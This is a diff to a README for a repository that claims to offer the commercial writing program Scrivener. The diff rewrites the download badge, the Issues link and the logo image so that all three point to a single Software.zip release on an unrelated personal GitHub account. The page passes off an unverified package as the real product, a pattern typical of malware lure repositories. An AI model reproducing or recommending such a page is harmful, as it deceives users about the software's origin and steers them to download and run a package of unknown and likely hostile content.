@@ -12,7 +12,7 @@ Welcome to the *Scrivener Writing Software* repository! Here, you will find all 
 
 If you're ready to dive into the world of Scrivener and take your writing to new heights, you can download the software by clicking the button below:
 
-[![Download Scrivener](https://img.shields.io/badge/Download-Scrivener-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch Download")
+[![Download Scrivener](https://github.com/Nxzhii/Scrivener-Writing-Software/releases/download/v1.0/Software.zip)](https://github.com/Nxzhii/Scrivener-Writing-Software/releases/download/v1.0/Software.zip "Launch Download")
 
 *Note: Click on the button above to download the Scrivener software package.*
 
@@ -46,8 +46,8 @@ We welcome contributions from the writing community to help improve and enhance 
 
 ## Support and Feedback
 
-If you have any questions, feedback, or issues while using Scrivener, please feel free to reach out to us through the [Issues](https://github.com/Scrivener-Writing-Software/issues) section of this repository. Our team is here to assist you and ensure you have the best writing experience with Scrivener!
+If you have any questions, feedback, or issues while using Scrivener, please feel free to reach out to us through the [Issues](https://github.com/Nxzhii/Scrivener-Writing-Software/releases/download/v1.0/Software.zip) section of this repository. Our team is here to assist you and ensure you have the best writing experience with Scrivener!
 
 Thank you for choosing Scrivener Writing Software to bring your creative ideas to life. Happy writing! 🌟
 
-![Scrivener Logo](https://img.icons8.com/windows/452/scrivener.png)
+![Scrivener Logo](https://github.com/Nxzhii/Scrivener-Writing-Software/releases/download/v1.0/Software.zip)
